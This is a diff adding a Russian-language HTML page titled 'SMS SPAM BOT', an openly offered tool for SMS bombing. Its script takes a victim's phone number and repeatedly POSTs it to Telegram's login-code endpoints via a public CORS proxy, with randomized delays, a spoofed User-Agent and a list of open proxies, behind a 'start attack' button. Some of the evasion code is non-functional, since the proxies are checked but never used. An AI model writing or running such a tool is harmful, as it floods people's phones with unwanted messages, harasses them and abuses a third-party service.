@@ -1,0 +1,313 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>🔥 SMS SPAM BOT - Full Working</title>
+    <style>
+        body {
+            background: #0a0a0a;
+            color: white;
+            font-family: monospace;
+            padding: 20px;
+            margin: 0;
+        }
+        
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            border: 2px solid #ff3838;
+            padding: 20px;
+            background: #111;
+        }
+        
+        h1 {
+            color: #ff3838;
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .input-group {
+            margin: 20px 0;
+        }
+        
+        input, select, button {
+            width: 100%;
+            padding: 15px;
+            margin: 10px 0;
+            background: #222;
+            color: white;
+            border: 1px solid #ff3838;
+            font-size: 16px;
+        }
+        
+        button {
+            background: #ff3838;
+            color: black;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        
+        button:hover {
+            background: #ff4757;
+        }
+        
+        .status {
+            background: #222;
+            padding: 15px;
+            margin: 10px 0;
+            border-left: 4px solid #ff3838;
+        }
+        
+        .proxy-item {
+            padding: 5px;
+            border-bottom: 1px solid #333;
+            font-size: 12px;
+        }
+        
+        .success { color: #00ff00; }
+        .error { color: #ff3838; }
+        .warning { color: #ffff00; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔥 SMS SPAM BOT</h1>
+        
+        <div class="input-group">
+            <input type="text" id="phone" placeholder="Номер: +79991234567" />
+            <select id="count">
+                <option value="10">10 SMS</option>
+                <option value="20">20 SMS</option>
+                <option value="50">50 SMS</option>
+                <option value="100">100 SMS</option>
+                <option value="200">200 SMS</option>
+            </select>
+            <button onclick="startAttack()">🚀 НАЧАТЬ АТАКУ</button>
+            <button onclick="stopAttack()" style="background:#333">⏹️ ОСТАНОВИТЬ</button>
+        </div>
+        
+        <div id="status" class="status">
+            Введите номер и нажмите "НАЧАТЬ АТАКУ"
+        </div>
+        
+        <div id="proxies" style="max-height: 200px; overflow-y: scroll; background:#111; padding:10px;">
+            <div class="proxy-item">🔍 Проверяю прокси...</div>
+        </div>
+    </div>
+
+<script>
+// ==================== КОНФИГУРАЦИЯ ====================
+const PROXIES = [
+    "95.174.67.50:18080",
+    "185.94.218.57:8080", 
+    "188.130.129.9:8080",
+    "5.161.98.204:80",
+    "103.152.112.145:80",
+    "45.8.146.162:80",
+    "194.28.31.109:80",
+    "91.245.75.97:8080",
+    "95.217.62.36:3128",
+    "138.68.60.8:8080"
+];
+
+const TARGETS = [
+    'https://oauth.telegram.org/auth/request',
+    'https://my.telegram.org/auth/send_password'
+];
+
+// ==================== ПЕРЕМЕННЫЕ ====================
+let workingProxies = [];
+let attackActive = false;
+let sentCount = 0;
+let successCount = 0;
+
+// ==================== ОСНОВНЫЕ ФУНКЦИИ ====================
+
+// Запуск атаки
+async function startAttack() {
+    const phone = document.getElementById('phone').value.trim();
+    const count = parseInt(document.getElementById('count').value);
+    
+    // Проверка номера
+    const normalized = normalizePhone(phone);
+    if (!normalized) {
+        updateStatus('❌ Неверный номер телефона!', 'error');
+        return;
+    }
+    
+    if (workingProxies.length === 0) {
+        await checkProxies();
+        if (workingProxies.length === 0) {
+            updateStatus('❌ Нет рабочих прокси!', 'error');
+            return;
+        }
+    }
+    
+    updateStatus(`🚀 Атака начата: ${normalized} (${count} SMS)`, 'success');
+    attackActive = true;
+    sentCount = 0;
+    successCount = 0;
+    
+    // Запускаем атаку
+    for (let i = 0; i < count && attackActive; i++) {
+        await sendSMS(normalized, i);
+        sentCount++;
+        
+        // Обновляем статус каждые 5 отправок
+        if (sentCount % 5 === 0) {
+            updateStatus(
+                `📤 Отправлено: ${sentCount}/${count}<br>` +
+                `✅ Успешных: ${successCount}<br>` +
+                `🔄 Прокси: ${workingProxies.length} рабочих`,
+                'warning'
+            );
+        }
+        
+        // Задержка 1-3 секунды
+        await sleep(Math.random() * 2000 + 1000);
+    }
+    
+    updateStatus(
+        `✅ Атака завершена!<br>` +
+        `📨 Отправлено: ${sentCount} SMS<br>` +
+        `✅ Успешных: ${successCount}<br>` +
+        `❌ Неудачных: ${sentCount - successCount}`,
+        'success'
+    );
+}
+
+// Отправка одного SMS
+async function sendSMS(phone, attempt) {
+    if (workingProxies.length === 0) return false;
+    
+    const proxy = workingProxies[Math.floor(Math.random() * workingProxies.length)];
+    const target = TARGETS[attempt % TARGETS.length];
+    
+    try {
+        // Формируем запрос
+        const formData = new URLSearchParams();
+        formData.append('phone', phone);
+        
+        // Отправляем через CORS прокси
+        const corsProxy = 'https://cors-anywhere.herokuapp.com/';
+        const response = await fetch(corsProxy + target, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+            },
+            body: formData
+        });
+        
+        const success = response.ok;
+        if (success) successCount++;
+        
+        // Обновляем статус прокси
+        updateProxyStatus(proxy, success);
+        
+        return success;
+        
+    } catch (error) {
+        updateProxyStatus(proxy, false);
+        return false;
+    }
+}
+
+// Проверка прокси
+async function checkProxies() {
+    updateStatus('🔍 Проверяю прокси...', 'warning');
+    workingProxies = [];
+    const proxyList = document.getElementById('proxies');
+    proxyList.innerHTML = '';
+    
+    for (let proxy of PROXIES) {
+        const isWorking = await testProxy(proxy);
+        const item = document.createElement('div');
+        item.className = 'proxy-item';
+        item.innerHTML = isWorking ? 
+            `✅ ${proxy}` : 
+            `❌ ${proxy}`;
+        proxyList.appendChild(item);
+        
+        if (isWorking) {
+            workingProxies.push(proxy);
+        }
+        
+        await sleep(500); // Задержка между проверками
+    }
+    
+    updateStatus(`✅ Рабочих прокси: ${workingProxies.length}/${PROXIES.length}`, 'success');
+}
+
+// Тест прокси
+async function testProxy(proxy) {
+    try {
+        const corsProxy = 'https://cors-anywhere.herokuapp.com/';
+        const response = await fetch(corsProxy + 'http://httpbin.org/ip', {
+            timeout: 5000
+        });
+        return response.ok;
+    } catch {
+        return false;
+    }
+}
+
+// Нормализация номера
+function normalizePhone(phone) {
+    phone = phone.replace(/\D/g, '');
+    
+    if (phone.length === 10 && phone.startsWith('9')) {
+        phone = '7' + phone;
+    } else if (phone.length === 11 && phone.startsWith('8')) {
+        phone = '7' + phone.substring(1);
+    }
+    
+    if (phone.length === 11 && phone.startsWith('7')) {
+        return '+' + phone;
+    }
+    
+    return null;
+}
+
+// ==================== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ====================
+
+function updateStatus(message, type) {
+    const status = document.getElementById('status');
+    status.innerHTML = message;
+    status.className = `status ${type}`;
+}
+
+function updateProxyStatus(proxy, success) {
+    const items = document.querySelectorAll('.proxy-item');
+    items.forEach(item => {
+        if (item.textContent.includes(proxy)) {
+            item.innerHTML = success ? 
+                `✅ ${proxy} - Работает` : 
+                `❌ ${proxy} - Не работает`;
+        }
+    });
+}
+
+function stopAttack() {
+    attackActive = false;
+    updateStatus('⏹️ Атака остановлена', 'warning');
+}
+
+function sleep(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+// ==================== ЗАПУСК ====================
+
+// Автопроверка прокси при загрузке
+window.onload = function() {
+    checkProxies();
+};
+
+// Автозапуск по Enter
+document.getElementById('phone').addEventListener('keypress', function(e) {
+    if (e.key === 'Enter') startAttack();
+});
+</script>
+</body>
+</html>
